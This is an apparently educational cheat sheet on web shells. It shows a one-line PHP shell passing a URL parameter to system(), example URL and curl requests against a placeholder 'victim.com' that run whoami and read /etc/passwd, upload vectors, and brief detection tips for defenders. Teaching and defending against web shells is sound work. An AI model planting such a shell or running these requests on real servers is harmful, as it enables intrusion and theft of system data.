# 🌐 Web Shell

## What Is a Web Shell?
A malicious script uploaded to a compromised web server. Lets an attacker execute OS commands remotely through a **browser** via HTTP requests.

**Key traits:**
- Written in server-side languages (PHP, ASP, JSP, CGI)
- Disguised as a normal file (e.g., `shell.php`)
- Accessed via URL — no special tool needed
- Hard to detect when hidden inside a web app

---

## How It Works — Step by Step

1. Find vulnerability — file upload bypass, LFI/RFI, command injection, or stolen credentials
2. Upload the web shell — e.g., `shell.php` to `/uploads/`
3. Access via browser or curl — `http://victim.com/uploads/shell.php`
4. Pass commands via URL parameters — server executes and returns output

---

## The Classic PHP Web Shell

```php
<?php if (isset($_GET['cmd'])) { system($_GET['cmd']); } ?>
```

| Part | What It Does |
|---|---|
| `$_GET['cmd']` | Reads the `cmd` parameter from the URL |
| `isset()` | Checks the parameter exists before running |
| `system()` | Executes the OS command and prints output |

---

## Command Examples via URL

```bash
# Who is the web server running as?
http://victim.com/uploads/shell.php?cmd=whoami

# List files
http://victim.com/uploads/shell.php?cmd=ls

# Read sensitive file
http://victim.com/uploads/shell.php?cmd=cat+/etc/passwd

# Network info
http://victim.com/uploads/shell.php?cmd=ifconfig

# Running processes
http://victim.com/uploads/shell.php?cmd=ps+aux
```
> 💡 Spaces in commands = `+` or `%20` in URLs.

### Using curl
```bash
curl "http://victim.com/uploads/shell.php?cmd=whoami"
curl "http://victim.com/uploads/shell.php?cmd=cat%20/etc/passwd"
```

---

## Popular Web Shells

| Shell | Language | Key Features |
|---|---|---|
| **p0wny-shell** | PHP | Minimal, single file, terminal-like UI |
| **b374k** | PHP | File manager + command execution, password protected |
| **c99 shell** | PHP | Feature-rich, server info, file operations |

---

## Upload Vectors (How They Get In)

| Vector | Description |
|---|---|
| Unrestricted File Upload | Server doesn't validate file type — attacker uploads `.php` directly |
| File Inclusion (LFI/RFI) | Attacker includes a remote malicious file |
| Command Injection | Inject OS commands to write shell to disk |
| Unauthorised Access | Stolen creds → FTP/SSH/admin panel upload |

---

## 🛡️ Detection Tips (Defender View)

- Unexpected `.php` files in upload directories
- Web logs with repeated `?cmd=` parameters
- Processes spawned by `www-data` unexpectedly
- File integrity monitoring alerts on new/modified files

---

## Key Takeaway
One file upload vulnerability → full remote code execution. The `cmd` parameter lets you run any OS command the web server user can execute.
